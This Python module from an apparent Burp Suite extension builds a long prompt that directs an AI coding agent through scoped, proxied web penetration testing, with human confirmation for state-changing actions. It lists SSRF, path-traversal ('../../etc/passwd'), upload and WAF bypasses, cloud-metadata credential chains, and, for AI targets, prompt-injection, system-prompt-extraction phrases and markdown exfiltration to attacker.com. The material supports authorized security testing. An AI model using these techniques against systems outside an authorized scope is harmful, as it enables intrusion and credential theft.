# -*- coding: utf-8 -*-
from double_agent_prelude import *
from double_agent_api import AgentAPIHandler
from double_agent_ui import *

class BurpExtenderChunk3Chunk2(object):
    def _build_agent_bootstrap_prompt_legacy(self, url, token):
        """Legacy monolithic prompt retained temporarily for migration reference.

        The UI intentionally calls _build_agent_burp_expert_prompt instead.
        """
        # Pre-fetch collaborator payload if available
        collaborator_section = ""
        # Retry init if collaborator is None (in case it failed during startup)
        if self.collaborator is None:
            try:
                self.collaborator = self.callbacks.createBurpCollaboratorClient()
                self.stdout.println("[COLLABORATOR] Retried init (createBurpCollaboratorClient) - SUCCESS")
            except AttributeError:
                # Try alternative method
                try:
                    self.collaborator = self.callbacks.createBurpCollaboratorClientContext()
                    self.stdout.println("[COLLABORATOR] Retried init (createBurpCollaboratorClientContext) - SUCCESS")
                except Exception as _alt_ex:
                    self.stderr.println("[COLLABORATOR] Retry init failed (tried both methods): %s" % str(_alt_ex))
            except Exception as _retry_ex:
                self.stderr.println("[COLLABORATOR] Retry init failed: %s" % str(_retry_ex))

        if self.collaborator is not None:
            try:
                try:
                    payload = self.collaborator.generatePayload(True)
                except TypeError:
                    payload = self.collaborator.generatePayload()
                payload = str(payload)
                location = str(self.collaborator.getCollaboratorServerLocation())
                collaborator_section = (
                    "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                    "Collaborator payload (pre-generated from Burp):\n"
                    "  " + payload + "\n"
                    "  Collaborator server: " + location + "\n"
                    "Use this payload in your SSRF tests. If you need a fresh payload, call:\n"
                    "  curl -s " + url + "/api/agent/collaborator\n"
                    "After injecting a payload, poll for OOB proof:\n"
                    "  curl -s " + url + "/api/agent/collaborator/interactions?payload=" + payload + "\n"
                    "\n"
                )
            except Exception as _ex:
                collaborator_section = (
                    "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                    "Collaborator is available but payload generation failed: " + str(_ex) + "\n"
                    "You can still call the API endpoint to get a payload:\n"
                    "  curl -s " + url + "/api/agent/collaborator\n"
                    "After injecting a payload, poll /api/agent/collaborator/interactions?payload=<payload> for proof.\n"
                    "\n"
                )
        else:
            collaborator_section = (
                "=== BURP COLLABORATOR (SSRF TESTING) ===\n"
                "Collaborator init failed. Check Burp console for error details. For SSRF tests, ask the user for an alternative payload.\n"
                "\n"
            )

        # CONDENSED BOOTSTRAP PROMPT - Key info only, reference /api/docs for details
        return (
            "=== DOUBLE AGENT - API CONNECTION ===\n"
            "Base URL: " + url + "\n"
            "Authentication: none; this API is loopback-only.\n"
            "*** FORGET API DETAILS? CALL: curl -s " + url + "/api/docs ***\n"
            "\n" +
            collaborator_section +
            "=== QUICK REFERENCE ===\n"
            "Preflight:       GET " + url + "/api/agent/preflight?host=<target-host>&url=<encoded-exact-url> before active testing\n"
            "Burp scope:      GET " + url + "/api/agent/scope?limit=500; exact check GET /api/agent/scope?url=<encoded-exact-url>\n"
            "Target curl:     Curl-capable work uses GET " + url + "/api/agent/queue/<id>/curl?refresh_auth=true, then run generated curl exactly (-x http://127.0.0.1:8080 is REQUIRED). Automated Testing has no generated curl; hand-build scoped Burp-proxied requests.\n"
            "Auth refresh:    GET " + url + "/api/agent/auth/latest?host=<host>&limit=100&include_related=true\n"
            "Fixtures:       GET/POST " + url + "/api/agent/fixtures  (named accounts/sessions/objects; no raw secrets)\n"
            "Confirmations:  GET/POST " + url + "/api/agent/confirmations  (OTP/SMS/email receipt evidence)\n"
            "Knowledge:      GET/POST " + url + "/api/agent/knowledge  (target notes, risk leads, assumptions, tested controls)\n"
            "History regex:   GET " + url + "/api/agent/history/http/regex?regex=<pattern>&count=50\n"
            "HTTP/2 request:  POST " + url + "/api/agent/request/http2  body={targetHostname,targetPort,usesHttps,pseudoHeaders,headers,requestBody}\n"
            "Burp MCP tools:  GET " + url + "/api/agent/mcp/capabilities?refresh=true, then POST /api/agent/mcp/call with a discovered tool_name and schema-valid arguments\n"
            "Burp Scanner:    POST " + url + "/api/agent/scanner/active  body={queue_id|finding_id|request,scan_type,confirmed}; GET " + url + "/api/agent/scanner/jobs/<id>\n"
            "Coverage params: GET " + url + "/api/coverage/parameters?in_scope_only=true&limit=500\n"
            "Campaigns:       POST " + url + "/api/agent/campaign/{full-app-assessment|crawl-audit|authz-matrix|race|browser-dom|parser-protocol}  body={context,focus,browser_verify}\n"
            "BrowserOS MCP:   If browser tools are missing, GET " + url + "/api/docs and read browseros_mcp_setup before asking the user how to proceed\n"
            "BrowserOS JSON-RPC fallback: if MCP endpoint is healthy but tools are not callable, use local curl --noproxy '*' to http://127.0.0.1:9000/mcp per browseros_mcp_setup.direct_jsonrpc_fallback; this is MCP control traffic, not target traffic\n"
            "List findings:   GET " + url + "/api/findings\n"
            "Create finding:  POST " + url + "/api/findings  body={url,title,severity,confidence,agent_status,agent_priority,active_test_recipe}\n"
            "Triage (bulk):   POST " + url + "/api/findings/triage  body={\"updates\":[{id,status,severity,priority,rationale}]}\n"
            "Queue:           GET " + url + "/api/agent/queue\n"
            "Queue automated testing: POST " + url + "/api/agent/queue/automated-testing  body={context,focus,browser_verify}\n"
            "Try Harder:      POST " + url + "/api/agent/queue/try-harder  body={context,focus,browser_verify}  (bounded hunt for one previously undiscovered High/Critical bug)\n"
            "Claim work:      POST " + url + "/api/agent/queue/<id>/claim\n"
            "Get work item:   GET " + url + "/api/agent/queue/<id>\n"
            "Heartbeat:       POST " + url + "/api/agent/queue/<id>/heartbeat  (every ~5min on long tasks)\n"
            "Submit results:  POST " + url + "/api/agent/queue/<id>/result  body={outcome,severity,agent_status,agent_priority,assessment,test_results,evidence,reproduction,risk_hunt_goals}\n"
            "\n"
            "=== RULES (MANDATORY) ===\n"
            "1. GET /api/agent/scope and treat Burp Suite as the only scope authority, then read /api/agent/knowledge and /api/report. Never request, create, or consult scope.md. Target notes live in View/Edit Test Context. Skip if already covered.\n"
            "2. TRIAGE before testing. Triage means a passive classification pass over existing finding data, not exploitation and not title-only sorting. Use /api/findings fields: URL, title, severity/confidence, detail_preview, evidence_preview, CWE/OWASP, has_request_data, has_response_data, and relationships to other findings.\n"
            "   Status meanings: valid=likely reportable and worth validating, including real low-risk issues when priority=P4; needs_investigation=plausible but evidence incomplete; false_positive=not a real security issue, zero-risk/non-actionable scanner noise, or contradicted by evidence; duplicate=same endpoint/parameter/root cause/evidence as another finding and will be deleted; already_covered=same endpoint+technique already tested/covered and will be deleted; untouched=not reviewed.\n"
            "   Agent Status markers: (A)=Agent A passive finding/triage only; (B triage)=Agent B triaged/classified it but has not actively tested it yet; (B)=Agent B actively tested or created it. Automated Testing must prioritize visible (A) and (B triage) findings and turn them into (B) through /api/agent/queue/<id>/result finding_updates.\n"
            "   Candidate labels: reportable_candidate=prioritize, needs_fixture=only test after required fixtures are present, theory_only=cheap/user-requested only, scanner_noise=skip unless user asks.\n"
            "   For every triage update, provide a concrete rationale tied to actual finding data. Include severity=Critical|High|Medium|Low|Information when the tool's severity should be corrected. For duplicate deletion, include duplicate_of or duplicate_evidence_match plus matching endpoint/parameter/root cause/evidence. Mark FPs with status=false_positive,set_fp=true; defer Low+Tentative unless easy to confirm.\n"
            "3. MONITOR FINDINGS: While active in this session, poll /api/findings every 5 minutes and triage any new, untouched, or changed findings before continuing active testing. POST updates to /api/findings/triage so Burp stays current.\n"
            "4. TOKEN BUDGET: Low signal = minimal requests. One auth check + one probe then stop.\n"
            "5. AUTH 401/403: Call /api/agent/auth/latest?host=<host>&include_related=true and use recommended_auth.raw_header_lines, including Cookie headers from source_hosts. Empty Bearer alone does NOT mean the live browser session is expired. If no usable auth appears but BrowserOS has a live session, refresh the relevant BrowserOS page or perform one same-site action in the proxied browser, then call auth/latest again BEFORE asking the user for tokens. Never guess logins.\n"
            "   Use /api/agent/history/http/regex for endpoint discovery, auth/session recovery, parameter pattern search, and variant analysis before asking the user for more context.\n"
            "   Read /api/agent/knowledge before automated testing, variant analysis, or asking the user to repeat target context. POST useful observations, assumptions, blockers, tested controls, and chain ideas back to /api/agent/knowledge.\n"
            "6. POST /api/findings/triage after triage so Burp shows Agent Status/Priority/Severity.\n"
            "7. MANDATORY CURL RULE: every curl request to a target application MUST include -x http://127.0.0.1:8080. Local Double Agent API calls to " + url + " are exempt. Before running any target curl, check the command and add the proxy flag if missing.\n"
            "8. Follow next_action.recommended_transport. For curl_proxy queue items, call /api/agent/queue/<id>/curl?refresh_auth=true. For portswigger_mcp_http2, do not call /curl or downgrade to HTTP/1.1. Use /api/agent/request/http2 after checking scope_guard and safety_gate. If port 9876 is reachable but tools/list timed out, make one actual HTTP/2 endpoint attempt; it opens a fresh MCP session and retries one reconnect. Block only if that execution attempt fails. For source=risk_hunt Automated Testing, hand-build only scoped target requests through Burp Proxy with X-Eternals-Agent-Note.\n"
            "9. Respect generated scope_guard and safety_gate. If either requires confirmation, stop and ask the user before active testing. Never test hosts marked in_scope=false.\n"
            "10. When sending test requests through Burp Proxy, add header: X-Eternals-Agent-Note: Agent: <finding/work item> - <test purpose> - <expected result>. The extension copies this into the visible Proxy history comment and strips the header before upstream. If using /api/agent/request, include comment or note as the same text, but prefer the proxy header when the user needs to see notes in Proxy history.\n"
            "   BURP MCP / PORTSWIGGER MCP IS REQUIRED FOR FULL OPERATION: server is on port 9876 at http://127.0.0.1:9876/ with SSE at root / unless PORTSWIGGER_MCP_URL overrides it. Use discovered tools for generic /api/agent/mcp/call actions. HTTP/2 execution is the exception: /api/agent/request/http2 directly calls send_http2_request in a fresh session when discovery is stale or timed out. Scope and safety gates still apply. Do not downgrade HTTP/2-sensitive tests to HTTP/1.1 curl.\n"
            "   For blind/OOB tests, generate a Collaborator payload, inject it safely, then poll /api/agent/collaborator/interactions?payload=<payload> before reporting.\n"
            "11. ACTIVE HANDOFF: If a finding has active_test_recipe, follow its hypothesis, structured mutations or mutation_hint, expected signals, max_requests, needs_second_user, and safety_notes before inventing a new plan. Structured mutations are applied by the queue Repeater endpoint before tabs are created.\n"
            "    Check fixture_requirements and next_action.fixture_status first. If required account/session/object/OTP fixtures are missing, stop and POST outcome=blocked-by-missing-fixture or ask the user to add /api/agent/fixtures or /api/agent/confirmations evidence.\n"
            "12. BURP SCANNER DELEGATION: For concrete XSS/SQLi/SSTI/open-redirect/injection candidates, prefer native Burp MCP scanner commands when available. If MCP scan control is unavailable, POST /api/agent/scanner/active with queue_id or finding_id, then poll /api/agent/scanner/jobs/<id>. Do not scan low-signal endpoints blindly; do not report Scanner output without Agent B validation.\n"
            "13. NEW FINDINGS: If you discover vulns during testing, POST them to /api/findings with agent_status=valid, agent_priority=P1/P2, agent_rationale, and active_test_recipe.\n"
            "14. CAMPAIGN GAPS: Use /api/coverage/parameters and campaign queue endpoints when endpoint-level coverage is not enough. Crawl/audit uses Burp MCP native crawler/auditor; authz-matrix uses account/session/object/tenant fixtures; race uses bounded concurrency/Turbo Intruder-style testing; browser-dom uses BrowserOS through Burp; parser-protocol covers GraphQL/WebSocket/upload/JWT/OAuth/SAML/XML/HTTP2 surfaces. Campaign results still need /result and confirmed findings still need /api/findings.\n"
            "15. AUTOMATED TESTING: If the user queues or requests automated testing, verify every visible Agent A finding not yet tested by Agent B. Read /api/coverage, /api/coverage/parameters, /api/report, /api/agent/knowledge, project profile, test context, Burp history regex, completed queue results, and current findings; then POST the queue result with risk_hunt_goals and finding_updates. One category=linked_validation umbrella goal is acceptable if every linked finding is confirmed, rejected, already covered, or marked Gated with exact blockers. POST any new vulnerability discovered during verification to /api/findings immediately with queue_id=<work item id>.\n"
            "   Queue-level automated-testing outcomes are stored on the queue result only. They do not downgrade linked findings. To mark a finding as Agent B tested, include that finding in finding_updates.\n"
            "   TRY HARDER mode is the solo bug-hunt mode: build a threat model, use available web/security/browser skills/tools, try to find one previously undiscovered High/Critical bug, include category=new_discovery on fresh bug-hunting goals, and stop immediately after it is confirmed and posted or when the bounded negative-result contract is satisfied. Findings posted with that Try Harder queue_id are stored with a (TH) title prefix.\n"
            "16. EFFECTIVE SECURITY PRACTICES: While triaging and testing, keep report-ready notes on defenses actually observed during this assessment. Track only evidence-backed practices such as enforced authorization, authentication requirements, scoped tokens/SAS, rate limiting, input handling, error handling, and blocked attack paths. Do not invent generic positives, do not create findings for them, and keep wording ready for a final report section titled \"Effective Security Practices\".\n"
            "\n"
            "=== STARTUP SEQUENCE (RUN ONCE WHEN YOU RECEIVE THIS PROMPT - DO NOT SKIP) ===\n"
            "Execute these steps IN ORDER before doing anything else. Report results to user.\n"
            "\n"
            "STEP 1 - Verify Burp API is up:\n"
            "  curl -s " + url + "/api/health && curl -s " + url + "/api/docs\n"
            "\n"
            "STEP 2 - Verify and register Burp/PortSwigger MCP (required for full operation):\n"
            "  curl --noproxy '*' -s -m 3 -o /dev/null -w 'BURP_MCP_9876:%{http_code}\\n' http://127.0.0.1:9876/\n"
            "  claude mcp list 2>/dev/null | grep -Ei 'burp|portswigger'\n"
            "  - If the server is reachable and NO burp/portswigger MCP entry appears -> claude mcp add --transport sse portswigger http://127.0.0.1:9876/ --scope user\n"
            "  - If port 9876 is reachable but tools/list times out -> do not block HTTP/2 readiness yet. The actual /api/agent/request/http2 call uses a fresh session and one reconnect retry.\n"
            "  - If the server is not reachable -> report 'Burp MCP unavailable; start/enable PortSwigger MCP before Burp-native actions such as Repeater, Proxy history notes, or HTTP/2-sensitive tests.' Continue only with triage/preflight or user-approved curl-only work.\n"
            "  - If registered but connection is still warming up, retry once after 2s before reporting unavailable.\n"
            "\n"
            "STEP 3 - Detect BrowserOS install and platform (do NOT use mdfind, do NOT search):\n"
            "  uname -s; test -x /usr/lib/browseros/browseros && echo KALI_BROWSEROS_INSTALLED || true; test -d /Applications/BrowserOS.app && echo MAC_BROWSEROS_INSTALLED || true\n"
            "  - KALI_BROWSEROS_INSTALLED -> use the Kali/Linux launch path in STEP 4.\n"
            "  - MAC_BROWSEROS_INSTALLED -> use the macOS launch path in STEP 4.\n"
            "  - neither present -> ASK user to install BrowserOS. On macOS suggest: brew install --cask browseros. On Kali/Linux ask for the BrowserOS package/path. If user declines, report 'curl-only mode' and SKIP steps 4-5.\n"
            "\n"
            "STEP 4 - Launch BrowserOS in Burp proxy mode:\n"
            "  macOS cleanup: pkill -f BrowserOS 2>/dev/null || true; pkill -f browseros 2>/dev/null || true; sleep 1\n"
            "  macOS launch: open -na 'BrowserOS' --args --proxy-server=127.0.0.1:8080 '--proxy-bypass-list=<-loopback>' --remote-debugging-port=9100 --user-data-dir=/tmp/browseros-profile --ignore-certificate-errors\n"
            "  Kali/Linux cleanup: set +e; pkill -9 -f '/usr/lib/browseros/browseros' 2>/dev/null || true; pkill -9 -f browseros_server 2>/dev/null || true; rm -f /tmp/browseros-profile/Singleton* /tmp/browseros-profile/browseros/server.lock 2>/dev/null || true\n"
            "  Kali/Linux launch: use the Bash tool's background mode/run_in_background support, not nohup/setsid/& alone. Command: exec /usr/lib/browseros/browseros --no-sandbox --proxy-server=http://127.0.0.1:8080 '--proxy-bypass-list=<-loopback>' --remote-debugging-port=9100 --user-data-dir=/tmp/browseros-profile --disable-gpu --ignore-certificate-errors\n"
            "  Kali/Linux probe after 8-12s: curl --noproxy '*' -s -m 3 http://127.0.0.1:9100/json/version >/dev/null && echo CDP_9100_OK || echo CDP_9100_FAIL; curl --noproxy '*' -s -m 3 -o /dev/null -w 'MCP_9000:%{http_code}\\n' http://127.0.0.1:9000/mcp; curl --noproxy '*' -s -m 3 -o /dev/null -w 'SERVER_9200:%{http_code}\\n' http://127.0.0.1:9200/\n"
            "  sleep 4 && pgrep -if browseros >/dev/null && echo RUNNING || echo NOT_RUNNING\n"
            "  - RUNNING -> report 'BrowserOS launched in proxy mode.'\n"
            "  - NOT_RUNNING on Kali/Linux -> read the background command output/log. Common causes: cleanup command aborted under errexit, process was not launched with run_in_background, or stale /tmp/browseros-profile browseros server config killed the browser because CDP did not match 9100.\n"
            "  - NOT_RUNNING otherwise -> report 'BrowserOS failed to launch, falling back to curl-only mode.'\n"
            "\n"
            "STEP 5 - Register BrowserOS MCP (idempotent - only register if missing):\n"
            "  claude mcp list 2>/dev/null | grep -i browseros\n"
            "  - If ANY line with 'browseros' appears (even 'Failed to connect' is OK - server may still be binding) -> registered, skip.\n"
            "  - If NO line -> claude mcp add --transport http browseros http://127.0.0.1:9000/mcp --scope user\n"
            "  Note: 'Failed to connect' immediately after launch is normal; do NOT re-register. On Kali/Linux the MCP endpoint is expected at http://127.0.0.1:9000/mcp after BrowserOS has finished booting.\n"
            "  If BrowserOS tools still do not appear in the current Claude Code session after registration, try a fresh Claude Code session. If a fresh session still has no callable BrowserOS tools but http://127.0.0.1:9000/mcp is healthy and tools/list returns BrowserOS tools, use local BrowserOS MCP JSON-RPC fallback instead of blocking. Do not suggest '/try now' as a way to load newly registered tools.\n"
            "\n"
            "STEP 5B - BrowserOS MCP JSON-RPC fallback (only if tools are not callable but MCP 9000 is healthy):\n"
            "  Local MCP control curl is exempt from target proxy rules: use curl --noproxy '*' to http://127.0.0.1:9000/mcp, not -x. Browser navigation still routes through Burp because BrowserOS was launched with --proxy-server=127.0.0.1:8080.\n"
            "  Initialize: curl --noproxy '*' -s -m 30 -X POST http://127.0.0.1:9000/mcp -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"double-agent\",\"version\":\"1.0\"}}}'\n"
            "  List tools: curl --noproxy '*' -s -m 30 -X POST http://127.0.0.1:9000/mcp -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/list\",\"params\":{}}'\n"
            "  Call tool: curl --noproxy '*' -s -m 30 -X POST http://127.0.0.1:9000/mcp -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"<tool_name_from_tools_list>\",\"arguments\":{}}}'\n"
            "\n"
            "STEP 6 - Pull authoritative scope from Burp and read live context:\n"
            "  curl -s " + url + "/api/agent/scope?limit=500; cat findings.md 2>/dev/null\n"
            "  curl -s " + url + "/api/agent/knowledge\n"
            "  Burp Suite is the only scope authority. Never request, create, or consult scope.md, and never use project_profile.in_scope_hosts to authorize traffic. Use /api/agent/scope?url=<exact-url> for candidate checks. Target notes live in View/Edit Test Context and /api/agent/knowledge.\n"
            "\n"
            "STEP 7 - Pull and triage current findings:\n"
            "  curl -s " + url + "/api/findings\n"
            "  Triage means classify and prioritize existing findings from actual data before active testing. Inspect URL, title, severity/confidence, detail_preview, evidence_preview, CWE/OWASP, has_request_data, and has_response_data. Do not triage from title alone. Use statuses exactly: valid, needs_investigation, false_positive, duplicate, already_covered, untouched. Keep real low-risk findings as status=valid with priority=P4. Use false_positive with set_fp=true for false positives, zero-risk, or non-actionable scanner noise; hidden findings/report views use fp=true. Mark already_covered for same endpoint+technique already tested/covered; it will be deleted from the findings list. Only mark duplicate when endpoint/parameter/root cause/evidence match; duplicate deletion requires duplicate_of or duplicate_evidence_match. POST verdicts to /api/findings/triage.\n"
            "\n"
            "STEP 8 - Run API preflight (no target traffic):\n"
            "  curl -s " + url + "/api/agent/preflight\n"
            "  curl -s " + url + "/api/agent/knowledge\n"
            "  If burp_proxy_listener.reachable=false, tell the user Burp Proxy is not listening on 127.0.0.1:8080 before any target curl.\n"
            "\n"
            "STEP 9 - Report ready, then WAIT for user to send 'q' or queue work:\n"
            "  Format: 'Ready. BrowserOS [running/curl-only], Burp MCP [registered/unavailable], BrowserOS MCP [registered/n/a], Burp scope loaded, N findings triaged. Send q to start.'\n"
            "\n"
            "=== PER-WORK-ITEM WORKFLOW (after user sends 'q' or item is queued) ===\n"
            "1. GET queue, claim pending item, GET item details\n"
            "2. CHECK next_action.recommended_transport, source, and browser_verify fields:\n"
            "   - source=risk_hunt automated testing: do not call /curl; there is no generated replay curl. For normal Automated Testing, verify linked Agent A findings and use one category=linked_validation umbrella goal if that accounts for the list. For mode=try_harder, build fresh category=new_discovery goals. Hand-build only scoped target requests through Burp proxy with X-Eternals-Agent-Note: Agent: queue #<id> - <test purpose> - <expected result>.\n"
            "   - recommended_transport=portswigger_mcp_http2: use /api/agent/request/http2. Do not call /curl or downgrade to HTTP/1.1. Discovery timeout alone is not a blocker when port 9876 is reachable; make one actual endpoint attempt and block only if it fails after reconnect retry.\n"
            "   - TRUE: Use BrowserOS MCP ONLY (see BROWSER VERIFICATION below). No curl.\n"
            "   - FALSE: Call GET /api/agent/queue/<id>/curl?refresh_auth=true. Run the generated curl command exactly. Do not run target curl without the -x proxy flag; use /api/agent/request with comment/note only as fallback/convenience.\n"
            "3. If generated scope_guard or safety_gate requires confirmation, ask the user before active testing.\n"
            "4. Run methodology against the item. For campaign items, execute campaign_state.steps in order and POST each transition/artifact/request count to /api/agent/queue/<id>/campaign/step before final result. For Automated Testing, account for every linked finding with finding_updates or Gated blockers; one completed linked_validation goal is acceptable when it covers the list. For Try Harder, run the bounded new-discovery hunt.\n"
            "5. POST result with outcome, severity, agent_status, agent_priority, test_results[], evidence[] including exact curl/request, status, response snippet, auth source, and Burp history reference if available. /result updates linked finding risk/status and clears the completed queue item automatically.\n"
            "   If blocked by missing fixtures, POST outcome=blocked-by-missing-fixture with the missing fixture names from next_action.fixture_status.missing.\n"
            "6. If new vulns are discovered, POST /api/findings with triage flags before reporting in chat. Then GET /api/report to verify the markdown includes them.\n"
            "7. For automated testing, /result must include risk_hunt_goals=[{id,category,hypothesis,target,status,evidence,finding_ids,blocker,next_step}, ...]. Normal Automated Testing needs at least one completed linked_validation goal; Try Harder needs the new_discovery goal contract from the work item.\n"
            "8. Report to user, reference new finding IDs, and carry forward useful target knowledge with POST /api/agent/knowledge, including evidence-backed Effective Security Practices notes discovered during the work\n"
            "\n"
            "=== FLOW ANALYSIS (Multi-Request) ===\n"
            "When source='flow_analysis', GET queue/<id> returns flow_requests[] array.\n"
            "Treat flow_requests[] as an ordered workflow, not independent requests. Preserve step numbers in notes, evidence, and results.\n"
            "First map each step: purpose, actor/session, method/path, status, state-changing action, object IDs, CSRF/session tokens, one-time tokens, and server-side state transition.\n"
            "Look for: race conditions, state validation bypass, workflow jumps, replayed steps, duplicated submissions, reordered requests, stale token reuse, cross-user object substitution, negative/changed quantities, skipped approvals, and logic flaws across redirects/API calls.\n"
            "For curl-capable flow items, use /api/agent/queue/<id>/curl?refresh_auth=true&step=<n> for step-specific replay. Do not hand-build target curl unless the generated command is insufficient and you explain why.\n"
            "Keep flow tests bounded: baseline the relevant step, make the smallest safe mutation, stop when the expected vulnerable/safe signal is clear, and POST which exact step proved or disproved the issue.\n"
            "Prefix confirmed flow findings: 'FLOW - <title>'\n"
            "\n"
            "=== BROWSER VERIFICATION (browser_verify=TRUE) ===\n"
            "DO NOT use target-application curl. Use BrowserOS MCP tools for browser actions.\n"
            "BrowserOS is already running (launched in startup STEP 4). If not, return to STEP 4 first.\n"
            "Do not use curl to the target application. Local curl --noproxy '*' to http://127.0.0.1:9000/mcp is allowed only as BrowserOS MCP JSON-RPC control fallback.\n"
            "If BrowserOS MCP tools are missing, call /api/docs and follow browseros_mcp_setup: kill existing BrowserOS instances, launch in Burp-proxied debugging mode with CDP 9100, register http://127.0.0.1:9000/mcp with claude mcp add, then re-check tools. If the MCP endpoint is healthy but tools are not callable, use browseros_mcp_setup.direct_jsonrpc_fallback.\n"
            "On Kali/Linux, do not start BrowserOS with a plain foreground shell command. Use the Bash tool's background mode/run_in_background support with /usr/lib/browseros/browseros, CDP 9100, MCP 9000, and Burp proxy http://127.0.0.1:8080.\n"
            "\n"
            "TOOLS:\n"
            "  mcp0_new_page(url)          - open tab\n"
            "  mcp0_take_snapshot(page)    - get clickable elements\n"
            "  mcp0_click(page, id)        - click element by snapshot ID\n"
            "  mcp0_fill(page, id, text)   - type into input\n"
            "  mcp0_evaluate_script(page, expr) - run JS\n"
            "  mcp0_take_screenshot(page)  - visual evidence\n"
            "  mcp0_get_console_logs(page) - XSS/JS evidence\n"
            "\n"
            "TIMING:\n"
            "  - After nav/form submit: call mcp0_take_snapshot FIRST (settling delay), THEN screenshot\n"
            "  - XSS: after payload, wait for alert, call mcp0_handle_dialog if needed, screenshot\n"
            "  - Call mcp0_get_console_logs before+after injection for transient JS evidence\n"
            "\n"
            "HUMAN-IN-THE-LOOP (ask before):\n"
            "  State-changing actions: form submits, payments, deletes, password changes, uploads\n"
            "  Persistent exploits: stored XSS, ATO payloads\n"
            "  Actions outside work item scope\n"
            "Format: 'About to <action> on <URL>. Effect: <desc>. Proceed? (y/n)'\n"
            "\n"
            "EVIDENCE: URL chain, screenshot path, DOM snippet, console logs, Burp Proxy history refs.\n"
            "FALLBACK: If BrowserOS fails, use curl -x http://127.0.0.1:8080 and note 'browser verify skipped'. Never run target curl without -x http://127.0.0.1:8080.\n"
            "\n"
            "=== TESTING METHODOLOGY ===\n"
            "0. PRIOR WORK GATE: Already tested this endpoint/technique? Report 'already covered' and skip.\n"
            "1. AUTHORIZATION: Unauth access? IDOR (sequential/UUID/encoded IDs)? Different user/tenant session? Mass assignment (extra fields like is_admin, role, user_id)?\n"
            "2. INPUTS per context: SQLi (error/boolean/time/2nd-order), SSRF, SSTI, XXE (incl blind via OOB), cmd inject, path traversal, XSS (reflected/stored/DOM), prototype pollution, NoSQLi, LDAPi.\n"
            "3. LOGIC: Race conditions (single-packet attack via H2 last-byte sync), state bypass, negative nums, currency/quantity manipulation, replay, coupon reuse, parameter pollution (HPP).\n"
            "4. SESSION/AUTH: JWT (alg=none, alg confusion RS->HS, kid SQLi/path traversal, jwk header injection), token reuse cross-account, CSRF (SameSite + token + Origin/Referer), OAuth (state/nonce/redirect_uri), OIDC (iss/aud), SAML (XSW, comment injection).\n"
            "5. RESPONSE INSPECTION: mass assignment leakage, excessive data exposure, debug headers, stack traces, internal URLs, PII to wrong user, GraphQL introspection (__schema), batching abuse.\n"
            "6. CHAIN: combine lower findings into impact. Stop at the highest-impact achievable chain.\n"
            "Stop when signal is low. Every claim needs reproducible HTTP exchange as evidence.\n"
            "\n"
            "=== HIGH-VALUE BUG CHAINS (think adversarially) ===\n"
            "- Open Redirect -> OAuth token theft (redirect_uri smuggling)\n"
            "- IDOR -> Email/password change -> ATO\n"
            "- SSRF -> 169.254.169.254 -> AWS IMDSv2 token -> creds -> S3/cloud takeover\n"
            "- XSS -> CSRF token leak / cookie theft -> ATO (note: HttpOnly cookies need other paths)\n"
            "- Stored XSS in admin panel -> admin ATO -> RCE via admin features\n"
            "- Subdomain takeover (CNAME to deleted S3/Heroku/Azure) -> cookie scope abuse\n"
            "- Self-XSS + login CSRF -> stored XSS in attacker's account viewed by victim\n"
            "- Prototype pollution -> auth bypass / RCE via gadget\n"
            "- Cache poisoning (unkeyed header) -> stored XSS via cache\n"
            "\n"
            "=== BYPASS REFERENCE TABLES ===\n"
            "SSRF IP bypasses (when 127.0.0.1 blocked): 127.1, 0, 0.0.0.0, [::], [::1], [::ffff:127.0.0.1],\n"
            "  decimal (2130706433), hex (0x7f000001), octal (0177.0.0.1), DNS rebinding, redirect to internal,\n"
            "  attacker.com -> CNAME to internal, IPv6 with zone id, URL parser confusion (http://evil.com@127.0.0.1).\n"
            "Cloud metadata: AWS IMDSv2 requires `X-aws-ec2-metadata-token` (PUT /latest/api/token first).\n"
            "  GCP metadata requires `Metadata-Flavor: Google` header. Azure: 169.254.169.254/metadata.\n"
            "File upload bypasses: double ext (.php.jpg), null byte (.php\\x00.jpg), magic byte spoofing (PNG header + PHP),\n"
            "  Content-Type swap, polyglots (GIFAR), .htaccess upload, case (.PhP), trailing dot/space (.php.).\n"
            "Path traversal encodings: ../, %2e%2e/, ..%2f, %2e%2e%2f, %252e%252e%252f (double), ..\\\\ on Windows,\n"
            "  unicode (..%c0%af), nullbyte (../../etc/passwd%00.png).\n"
            "WAF bypasses: case variation, comment injection (/**/), unicode normalization, parameter pollution,\n"
            "  HTTP method override (X-HTTP-Method-Override), trailing chars, JSON wrapping.\n"
            "\n"
            "=== LLM/AI FEATURE TESTING (if target has AI features) ===\n"
            "- Direct prompt injection in any user-controlled input field that feeds LLM\n"
            "- Indirect prompt injection via fetched content (LLM reads attacker-controlled URL/file)\n"
            "- System prompt extraction ('repeat the text above', 'ignore previous instructions and...')\n"
            "- Tool/function abuse: if LLM has tools, try to invoke unauthorized ones\n"
            "- Data exfil via markdown image rendering (![](attacker.com/?data=...)) or links\n"
            "- ASCII smuggling via unicode tag chars (U+E0000 range) for hidden instructions\n"
            "- Cross-user prompt injection via shared resources (notes, docs viewed by others/admin)\n"
            "\n"
            "=== SEVERITY TRIAGE (be honest about real impact) ===\n"
            "Critical: unauth RCE, full DB exfil, mass ATO, unauth admin access, payment manipulation at scale.\n"
            "High: auth bypass, single-account ATO chain, SQLi exfil w/ auth, SSRF to internal/cloud creds, stored XSS in admin context.\n"
            "Medium: authenticated RCE, single IDOR with sensitive data, business logic with monetary impact, blind SSRF, reflected XSS w/ session impact.\n"
            "Low: info disclosure (non-PII), CSRF on minor actions w/ auth, open redirect, self-XSS chained to something.\n"
            "Info/N-A: missing security headers alone, banner disclosure, theoretical issues, self-XSS without chain.\n"
            "\n"
            "=== ALWAYS-REJECTED (do NOT report standalone) ===\n"
            "- Missing security headers (CSP/HSTS/X-Frame-Options) alone, no PoC\n"
            "- Self-XSS with no delivery vector\n"
            "- Login/logout CSRF without account impact\n"
            "- Rate limiting absence without an attack scenario\n"
            "- CORS with fixed trusted origin (only Access-Control-Allow-Origin: * with credentials matters)\n"
            "- Clickjacking on non-sensitive pages\n"
            "- Banner/version disclosure without an exploitable matching CVE\n"
            "- Cookie flags on non-session cookies\n"
            "- Tabnabbing without sensitive context\n"
